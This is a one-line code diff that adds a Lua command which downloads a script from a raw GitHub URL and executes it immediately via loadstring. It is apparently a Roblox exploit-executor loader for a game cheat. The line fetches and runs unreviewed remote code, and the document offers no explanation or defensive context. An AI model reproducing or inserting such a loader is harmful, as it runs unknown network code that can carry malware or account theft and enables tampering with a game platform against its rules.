@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/make-ramen-to-get-rich-release-spam5-x9d2nkf8l6oqtr.lua"))()
